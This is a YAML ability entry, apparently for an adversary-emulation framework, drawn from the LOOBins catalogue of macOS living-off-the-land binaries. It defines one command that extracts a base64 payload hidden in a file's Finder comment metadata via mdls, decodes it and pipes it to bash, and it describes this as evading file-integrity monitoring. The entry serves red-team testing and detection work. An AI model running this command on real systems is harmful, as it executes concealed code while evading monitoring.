- id: be9fc08f-eb32-da0b-47fe-7a6ba40c62cb
  name: mdls - Extract and execute payload stored in Finder comment metadata
  description: Every file on macOS has a Finder comment field stored as Spotlight metadata under the kMDItemFinderComment
    attribute. mdls can read this field and pipe its contents to a decoder and executor. Because the payload
    lives entirely in Spotlight metadata rather than file contents, it is not visible to file-based inspection
    or integrity monitoring tools. Finder comments can be written remotely via osascript over Remote Apple
    Events or SSH, making this a covert staging mechanism for lateral movement payloads.
  tactic: execution
  technique:
    attack_id: T1083
    name: File and Directory Discovery
  platforms:
    darwin:
      sh:
        command: mdls -name kMDItemFinderComment -raw ~/Desktop/payload_carrier.txt | base64 -D | bash
  singleton: false
  privilege: User
  repeatable: true
  delete_payload: false
  buckets:
  - loobins
  - mdls
  - execution
  version: '1.0'
  author: LOOBins Project
  additional_info:
    loobins_tool: mdls
    use_case: Extract and execute payload stored in Finder comment metadata
